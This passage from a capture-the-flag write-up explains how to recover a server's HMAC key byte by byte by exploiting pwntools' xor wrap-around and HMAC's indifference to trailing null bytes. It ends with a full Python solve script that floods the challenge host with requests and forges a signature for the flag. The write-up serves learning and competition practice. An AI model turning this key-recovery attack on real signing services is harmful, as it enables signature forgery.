<code>HMAC</code>’s parameter. And because brute-forcing all the 256
combinations of the 1-byte key was definitely doable, we could easily
recover the server key byte by byte.</p><p>Unfortunately the function is no longer used in this challenge, and
is instead replaced with the <code>xor</code> method from
<code>pwntools</code>. This library function ensures that no matter what
we put as the client key, the resulting key would never be less than 16
bytes:</p><div class=sourceCode id=cb20><pre class="sourceCode python"><code class="sourceCode python"><span id=cb20-1><a href=#cb20-1 aria-hidden=true tabindex=-1></a>In [<span class=dv>5</span>]: pwn.xor(<span class=bu>bytes</span>.fromhex(<span class=st>&#39;deadbeefdeadbeefdeadbeefdeadbeef&#39;</span>), <span class=st>b&#39;</span><span class=ch>\0</span><span class=st>&#39;</span>)</span>
<span id=cb20-2><a href=#cb20-2 aria-hidden=true tabindex=-1></a>Out[<span class=dv>5</span>]: <span class=st>b&#39;</span><span class=ch>\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef\xde\xad\xbe\xef</span><span class=st>&#39;</span></span></code></pre></div><p>What’s worse is that we can’t just feed the same message twice for
the program to sign, since an incrementing ID <span class="math inline">\(i \in \mathbb{N}\)</span> would be prepended to
each message before hashing.</p><h3 id=padding-oracle-for-hmac>Padding oracle? For… HMAC?</h3><p>Stare at your computer for long enough and you’ll eventually discover
two interesting properties: 1. If <code>xor</code> has strings of
different lengths as arguments, the shorter string gets warped around
(instead of the longer string getting trimmed): <span class="math display">\[
\text{deadbeef}_{16} \oplus\text{abc}_{16} =
\text{deadbeef}_{16}\oplus\text{abcabcab}_{16}
\]</span> 2. Appending the HMAC key with null bytes has no effect on the
resulting hash: <span class="math display">\[
\text{HMAC}(\text{deadbeef}_{16}, i \mathbin\Vert m) =
\text{HMAC}(\text{deadbeef00}_{16}, i \mathbin\Vert m)\]</span></p><p>Wait.. it feels the second property could be exploited by being used
to <em>verify</em> a byte in the server key. To be precise, assume <span class="math inline">\(k_s = \text{deadbeef}_{16}\)</span>. We want to
craft <span class="math inline">\(\text{deadbeef00}_{16}\)</span> as the
HMAC key, which also generates the same hash: <span class="math display">\[
\text{deadbeef}_{16} \oplus k_c = \text{deadbeef00}_{16}
\]</span></p><p>Now what could <span class="math inline">\(k_c\)</span> be? It must
be 1 byte longer than <span class="math inline">\(k_s\)</span> (5 bytes
in total), and recall the first property, where <span class="math inline">\(k_s\)</span> gets warped around: <span class="math display">\[
\text{deadbeef}_{16} \oplus k_c = \text{deadbeefde}_{16} \oplus k_c
\]</span></p><p>Now if <span class="math inline">\(k_c\)</span> also ends with the
byte <span class="math inline">\(\text{de}_{16}\)</span>, the byte gets
canceled: <span class="math display">\[
\text{deadbeefde}_{16} \oplus \text{00000000de} =\text{deadbeef00}_{16}
\]</span></p><p>This implies signing with the two client keys, <span class="math inline">\(k_c = \text{00000000de}\)</span> and <span class="math inline">\(k_c' = 0\)</span>, gives the same hash: <span class="math display">\[\text{Sign}_i(k_c, m) =
\text{HMAC}(\text{deadbeef00}_{16}, i \mathbin\Vert m) =
\text{HMAC}(\text{deadbeef}_{16}, i \mathbin\Vert m)
= \text{Sign}_i(k_c', m)\]</span></p><p>In other words, if we obtain the same signatures from them, we’ll
know the first byte of <span class="math inline">\(k_s\)</span> must be
<span class="math inline">\(\text{de}_{16}\)</span>.</p><p>Can we generalize this technique to the other bytes in <span class="math inline">\(k_s\)</span>? Yep. And in fact we can even verify
the other bytes without even knowing the first one. For example, letting
<span class="math inline">\(k_c = \text{0000000000ad}\)</span> and <span class="math inline">\(k_c' = 0000000000_{16}\)</span> , we can see
that <span class="math display">\[
k_s \oplus k_c = \text{deadbeefde00}_{16}
\]</span></p><p>would yield the same hash as</p><p><span class="math display">\[
k_s \oplus k_c' = \text{deadbeefde}_{16}
\]</span></p><h3 id=more-than-just-a-crypto-challenge>More than just a crypto
challenge</h3><p>The solution I tried during the competition involved waiting for the
signature hash from the server every time I sent a client key,
essentially taking as much as <span class="math inline">\(256 \cdot
16\)</span> round trips from/to the server to fully recover the server
key. That doesn’t fit really well into the 2-minute time limit set by
the server. Can we do better than that?</p><p>If you look into how TCP sockets work, basically the I/O is buffered.
So if we quickly send lots of packets to the server, they queue up at
the server side, and the server processes them in the same order as how
we sent them. Exploiting this fact, we can shrink down our runtime to
ideally <em>one round trip</em>:</p><figure><img src=/hkcert/SyF_MDBET.png alt=smaf2(1)><figcaption aria-hidden=true>smaf2(1)</figcaption></figure><p>(Practically the server wouldn’t be able to keep up if there are too
many concurrent requests; I had to keep the batch size around 10k)</p><p>There’s one more problem waiting for us. Remember how a unique <span class="math inline">\(i\)</span> was prepended to every message we sent?
In order to <em>verify</em> that <span class="math display">\[
\text{Sign}_i(k_c, m) = \text{Sign}_j(k_c', m)
\]</span></p><p>we need to have <span class="math inline">\(i = j\)</span>, which is
impossible in reality. How do we get around that?</p><p>Well, since the digits of <span class="math inline">\(i\)</span> are
directly prepended to the message, we can just prepend the digit
<code>0</code> to <span class="math inline">\(m\)</span> beforehand, so
it becomes ‘the last digit of the ID’. Then when <span class="math inline">\(j\)</span> hits <span class="math inline">\(10i\)</span>, just send the same message again but
without the <code>0</code>:<br><span class="math display">\[
\text{Sign}_i(k_c, 0 \mathbin\Vert m) = \text{HMAC}(k_s \oplus k_c, i
\mathbin\Vert 0 \mathbin\Vert m) = \text{HMAC}(k_s \oplus k_c', 10i
\mathbin\Vert m) = \text{Sign}_{10i}(k_c', m)
\]</span></p><h3 id=solution-2>Solution</h3><ol type=1><li>Start by guessing <span class="math inline">\(b = {00}_{16}\)</span>
to be the <span class="math inline">\(n\)</span>th byte of <span class="math inline">\({k_s}\)</span>. Prepare: <span class="math display">\[k_c' = (\underset{i=1} {\overset{16 + n}
{\LARGE ||}} {00}_{16}) \;\;\;\;\;\;\;\;\;\; k_c = k_c'
\mathbin\Vert b\]</span></li><li>Ask the server to give us <span class="math inline">\(\text{Sign}_{i}(k_c, 0 \mathbin\Vert
m)\)</span></li><li>Repeat for all of the 256 possible values of <span class="math inline">\(b\)</span>.</li><li>Whenever the ID reaches <span class="math inline">\(10i\)</span>,
call <span class="math inline">\(\text{Sign}_{10i}(k_c', m)\)</span>
and see if the result matches the hash from the <span class="math inline">\(i\)</span>th iteration.</li><li>Repeat all of the above steps to obtain all bytes in the server key.
Now what else can’t you do?</li></ol><div class=sourceCode id=cb21><pre class="sourceCode python"><code class="sourceCode python"><span id=cb21-1><a href=#cb21-1 aria-hidden=true tabindex=-1></a><span class=im>import</span> hashlib</span>
<span id=cb21-2><a href=#cb21-2 aria-hidden=true tabindex=-1></a><span class=im>import</span> hmac</span>
<span id=cb21-3><a href=#cb21-3 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-4><a href=#cb21-4 aria-hidden=true tabindex=-1></a><span class=im>from</span> pwn <span class=im>import</span> <span class=op>*</span></span>
<span id=cb21-5><a href=#cb21-5 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-6><a href=#cb21-6 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-7><a href=#cb21-7 aria-hidden=true tabindex=-1></a><span class=kw>def</span> sign_message(key_client: <span class=bu>bytes</span>, key_server: <span class=bu>bytes</span>, <span class=bu>id</span>: <span class=bu>int</span>, message: <span class=bu>str</span>) <span class=op>-&gt;</span> <span class=bu>bytes</span>:</span>
<span id=cb21-8><a href=#cb21-8 aria-hidden=true tabindex=-1></a>    key_combined <span class=op>=</span> xor(key_client, key_server)</span>
<span id=cb21-9><a href=#cb21-9 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-10><a href=#cb21-10 aria-hidden=true tabindex=-1></a>    signature <span class=op>=</span> hmac.new(key_combined, <span class=ss>f&#39;</span><span class=sc>{</span><span class=bu>id</span><span class=sc>}{</span>message<span class=sc>}</span><span class=ss>&#39;</span>.encode(),</span>
<span id=cb21-11><a href=#cb21-11 aria-hidden=true tabindex=-1></a>                         hashlib.sha256).digest()</span>
<span id=cb21-12><a href=#cb21-12 aria-hidden=true tabindex=-1></a>    <span class=cf>return</span> signature</span>
<span id=cb21-13><a href=#cb21-13 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-14><a href=#cb21-14 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-15><a href=#cb21-15 aria-hidden=true tabindex=-1></a><span class=kw>def</span> sign(r, key_client: <span class=bu>bytes</span>, message: <span class=bu>str</span>):</span>
<span id=cb21-16><a href=#cb21-16 aria-hidden=true tabindex=-1></a>    r.sendline(<span class=st>b&#39;sign&#39;</span>)</span>
<span id=cb21-17><a href=#cb21-17 aria-hidden=true tabindex=-1></a>    r.sendline(key_client.<span class=bu>hex</span>().encode())</span>
<span id=cb21-18><a href=#cb21-18 aria-hidden=true tabindex=-1></a>    r.sendline(message.encode())</span>
<span id=cb21-19><a href=#cb21-19 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-20><a href=#cb21-20 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-21><a href=#cb21-21 aria-hidden=true tabindex=-1></a><span class=kw>def</span> get_flag(r, <span class=bu>id</span>, key_server: <span class=bu>bytes</span>):</span>
<span id=cb21-22><a href=#cb21-22 aria-hidden=true tabindex=-1></a>    signature <span class=op>=</span> sign_message(<span class=st>b&#39;</span><span class=ch>\0</span><span class=st>&#39;</span><span class=op>*</span><span class=dv>16</span>, key_server, <span class=bu>id</span>, <span class=st>&#39;gib flag pls&#39;</span>)</span>
<span id=cb21-23><a href=#cb21-23 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-24><a href=#cb21-24 aria-hidden=true tabindex=-1></a>    r.sendline(<span class=st>b&#39;verify&#39;</span>)</span>
<span id=cb21-25><a href=#cb21-25 aria-hidden=true tabindex=-1></a>    r.sendline(<span class=st>b&#39;gib flag pls&#39;</span>)</span>
<span id=cb21-26><a href=#cb21-26 aria-hidden=true tabindex=-1></a>    r.sendline(signature.<span class=bu>hex</span>().encode())</span>
<span id=cb21-27><a href=#cb21-27 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-28><a href=#cb21-28 aria-hidden=true tabindex=-1></a>    r.recvuntil(<span class=st>&#39;🏁 &#39;</span>.encode())</span>
<span id=cb21-29><a href=#cb21-29 aria-hidden=true tabindex=-1></a>    <span class=cf>return</span> r.recvline().decode().strip()</span>
<span id=cb21-30><a href=#cb21-30 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-31><a href=#cb21-31 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-32><a href=#cb21-32 aria-hidden=true tabindex=-1></a>hashes: <span class=bu>list</span>[<span class=bu>list</span>[<span class=va>None</span> <span class=op>|</span> <span class=bu>bytes</span>]] <span class=op>=</span> [[<span class=va>None</span>] <span class=op>*</span> <span class=dv>256</span> <span class=cf>for</span> _ <span class=kw>in</span> <span class=bu>range</span>(<span class=dv>16</span>)]</span>
<span id=cb21-33><a href=#cb21-33 aria-hidden=true tabindex=-1></a>what_i_sent: <span class=bu>list</span>[<span class=bu>tuple</span>[<span class=bu>int</span>, <span class=bu>int</span>] <span class=op>|</span> <span class=va>None</span>] <span class=op>=</span> [<span class=va>None</span>] <span class=op>*</span> <span class=dv>40960</span></span>
<span id=cb21-34><a href=#cb21-34 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-35><a href=#cb21-35 aria-hidden=true tabindex=-1></a>r <span class=op>=</span> remote(<span class=st>&#39;chal./hkcert23.pwnable.hk&#39;</span>, <span class=dv>28009</span>)</span>
<span id=cb21-36><a href=#cb21-36 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-37><a href=#cb21-37 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-38><a href=#cb21-38 aria-hidden=true tabindex=-1></a><span class=kw>def</span> sign_byte(index, b, <span class=bu>id</span>):</span>
<span id=cb21-39><a href=#cb21-39 aria-hidden=true tabindex=-1></a>    byte <span class=op>=</span> <span class=bu>int</span>.to_bytes(b, <span class=dv>1</span>, <span class=st>&#39;big&#39;</span>)</span>
<span id=cb21-40><a href=#cb21-40 aria-hidden=true tabindex=-1></a>    key <span class=op>=</span> <span class=st>b&#39;</span><span class=ch>\x00</span><span class=st>&#39;</span> <span class=op>*</span> (<span class=dv>16</span> <span class=op>+</span> index) <span class=op>+</span> byte</span>
<span id=cb21-41><a href=#cb21-41 aria-hidden=true tabindex=-1></a>    message <span class=op>=</span> <span class=st>&#39;0 hello&#39;</span></span>
<span id=cb21-42><a href=#cb21-42 aria-hidden=true tabindex=-1></a>    sign(r, key, message)</span>
<span id=cb21-43><a href=#cb21-43 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-44><a href=#cb21-44 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-45><a href=#cb21-45 aria-hidden=true tabindex=-1></a><span class=kw>def</span> verify_byte(index, b):</span>
<span id=cb21-46><a href=#cb21-46 aria-hidden=true tabindex=-1></a>    key <span class=op>=</span> <span class=st>b&#39;</span><span class=ch>\x00</span><span class=st>&#39;</span> <span class=op>*</span> (<span class=dv>16</span> <span class=op>+</span> index)</span>
<span id=cb21-47><a href=#cb21-47 aria-hidden=true tabindex=-1></a>    sign(r, key, <span class=st>&#39; hello&#39;</span>)</span>
<span id=cb21-48><a href=#cb21-48 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-49><a href=#cb21-49 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-50><a href=#cb21-50 aria-hidden=true tabindex=-1></a>n <span class=op>=</span> <span class=dv>0</span></span>
<span id=cb21-51><a href=#cb21-51 aria-hidden=true tabindex=-1></a>key_server <span class=op>=</span> [<span class=dv>0</span>] <span class=op>*</span> <span class=dv>16</span></span>
<span id=cb21-52><a href=#cb21-52 aria-hidden=true tabindex=-1></a><span class=cf>for</span> <span class=bu>id</span> <span class=kw>in</span> <span class=bu>range</span>(<span class=dv>0</span>, <span class=dv>50000</span>):</span>
<span id=cb21-53><a href=#cb21-53 aria-hidden=true tabindex=-1></a>    <span class=cf>if</span> <span class=bu>id</span> <span class=op>==</span> <span class=dv>0</span>:</span>
<span id=cb21-54><a href=#cb21-54 aria-hidden=true tabindex=-1></a>        <span class=co># send random stuff</span></span>
<span id=cb21-55><a href=#cb21-55 aria-hidden=true tabindex=-1></a>        sign_byte(<span class=dv>0</span>, <span class=dv>0</span>, <span class=bu>id</span>)</span>
<span id=cb21-56><a href=#cb21-56 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-57><a href=#cb21-57 aria-hidden=true tabindex=-1></a>    <span class=cf>elif</span> <span class=bu>id</span> <span class=op>%</span> <span class=dv>10</span> <span class=op>==</span> <span class=dv>0</span> <span class=kw>and</span> what_i_sent[<span class=bu>id</span> <span class=op>//</span> <span class=dv>10</span>] <span class=kw>is</span> <span class=kw>not</span> <span class=va>None</span>:</span>
<span id=cb21-58><a href=#cb21-58 aria-hidden=true tabindex=-1></a>        index, b <span class=op>=</span> what_i_sent[<span class=bu>id</span> <span class=op>//</span> <span class=dv>10</span>]</span>
<span id=cb21-59><a href=#cb21-59 aria-hidden=true tabindex=-1></a>        verify_byte(index, b)</span>
<span id=cb21-60><a href=#cb21-60 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-61><a href=#cb21-61 aria-hidden=true tabindex=-1></a>    <span class=cf>elif</span> n <span class=op>&lt;</span> <span class=dv>4096</span>:</span>
<span id=cb21-62><a href=#cb21-62 aria-hidden=true tabindex=-1></a>        what_i_sent[<span class=bu>id</span>] <span class=op>=</span> (n <span class=op>//</span> <span class=dv>256</span>, n <span class=op>%</span> <span class=dv>256</span>)</span>
<span id=cb21-63><a href=#cb21-63 aria-hidden=true tabindex=-1></a>        sign_byte(n <span class=op>//</span> <span class=dv>256</span>, n <span class=op>%</span> <span class=dv>256</span>, <span class=bu>id</span>)</span>
<span id=cb21-64><a href=#cb21-64 aria-hidden=true tabindex=-1></a>        n <span class=op>+=</span> <span class=dv>1</span></span>
<span id=cb21-65><a href=#cb21-65 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-66><a href=#cb21-66 aria-hidden=true tabindex=-1></a>    <span class=cf>else</span>:</span>
<span id=cb21-67><a href=#cb21-67 aria-hidden=true tabindex=-1></a>        <span class=co># send random stuff</span></span>
<span id=cb21-68><a href=#cb21-68 aria-hidden=true tabindex=-1></a>        sign_byte(<span class=dv>0</span>, <span class=dv>0</span>, <span class=bu>id</span>)</span>
<span id=cb21-69><a href=#cb21-69 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-70><a href=#cb21-70 aria-hidden=true tabindex=-1></a><span class=co># Receive bytes</span></span>
<span id=cb21-71><a href=#cb21-71 aria-hidden=true tabindex=-1></a>n <span class=op>=</span> <span class=dv>0</span></span>
<span id=cb21-72><a href=#cb21-72 aria-hidden=true tabindex=-1></a><span class=cf>for</span> <span class=bu>id</span> <span class=kw>in</span> <span class=bu>range</span>(<span class=dv>0</span>, <span class=dv>50000</span>):</span>
<span id=cb21-73><a href=#cb21-73 aria-hidden=true tabindex=-1></a>    r.recvuntil(<span class=st>&#39;📝 &#39;</span>.encode())</span>
<span id=cb21-74><a href=#cb21-74 aria-hidden=true tabindex=-1></a>    <span class=bu>hash</span> <span class=op>=</span> r.recvline().decode().strip()</span>
<span id=cb21-75><a href=#cb21-75 aria-hidden=true tabindex=-1></a>    <span class=cf>assert</span> <span class=bu>len</span>(<span class=bu>hash</span>) <span class=op>==</span> <span class=dv>64</span></span>
<span id=cb21-76><a href=#cb21-76 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-77><a href=#cb21-77 aria-hidden=true tabindex=-1></a>    <span class=cf>if</span> <span class=bu>id</span> <span class=op>==</span> <span class=dv>0</span>:</span>
<span id=cb21-78><a href=#cb21-78 aria-hidden=true tabindex=-1></a>        <span class=co># ignore</span></span>
<span id=cb21-79><a href=#cb21-79 aria-hidden=true tabindex=-1></a>        <span class=cf>continue</span></span>
<span id=cb21-80><a href=#cb21-80 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-81><a href=#cb21-81 aria-hidden=true tabindex=-1></a>    <span class=cf>elif</span> <span class=bu>id</span> <span class=op>%</span> <span class=dv>10</span> <span class=op>==</span> <span class=dv>0</span> <span class=kw>and</span> what_i_sent[<span class=bu>id</span> <span class=op>//</span> <span class=dv>10</span>] <span class=kw>is</span> <span class=kw>not</span> <span class=va>None</span>:</span>
<span id=cb21-82><a href=#cb21-82 aria-hidden=true tabindex=-1></a>        index, b <span class=op>=</span> what_i_sent[<span class=bu>id</span> <span class=op>//</span> <span class=dv>10</span>]</span>
<span id=cb21-83><a href=#cb21-83 aria-hidden=true tabindex=-1></a>        <span class=cf>if</span> hashes[index][b] <span class=op>==</span> <span class=bu>hash</span>:</span>
<span id=cb21-84><a href=#cb21-84 aria-hidden=true tabindex=-1></a>            key_server[index] <span class=op>=</span> b</span>
<span id=cb21-85><a href=#cb21-85 aria-hidden=true tabindex=-1></a>            <span class=bu>print</span>(<span class=st>&#39;Found byte&#39;</span>, index, <span class=st>&#39;:&#39;</span>, b)</span>
<span id=cb21-86><a href=#cb21-86 aria-hidden=true tabindex=-1></a>            <span class=cf>if</span> index <span class=op>==</span> <span class=dv>15</span>:</span>
<span id=cb21-87><a href=#cb21-87 aria-hidden=true tabindex=-1></a>                <span class=cf>break</span></span>
<span id=cb21-88><a href=#cb21-88 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-89><a href=#cb21-89 aria-hidden=true tabindex=-1></a>    <span class=cf>elif</span> n <span class=op>&lt;</span> <span class=dv>4096</span>:</span>
<span id=cb21-90><a href=#cb21-90 aria-hidden=true tabindex=-1></a>        index, b <span class=op>=</span> what_i_sent[<span class=bu>id</span>]</span>
<span id=cb21-91><a href=#cb21-91 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-92><a href=#cb21-92 aria-hidden=true tabindex=-1></a>        <span class=cf>assert</span> hashes[index][b] <span class=kw>is</span> <span class=va>None</span></span>
<span id=cb21-93><a href=#cb21-93 aria-hidden=true tabindex=-1></a>        hashes[index][b] <span class=op>=</span> <span class=bu>hash</span></span>
<span id=cb21-94><a href=#cb21-94 aria-hidden=true tabindex=-1></a>        n <span class=op>+=</span> <span class=dv>1</span></span>
<span id=cb21-95><a href=#cb21-95 aria-hidden=true tabindex=-1></a></span>
<span id=cb21-96><a href=#cb21-96 aria-hidden=true tabindex=-1></a><span class=bu>print</span>(get_flag(r, <span class=dv>50000</span>, <span class=bu>bytes</span>(key_server)))</span></code></pre></div></article></body></html>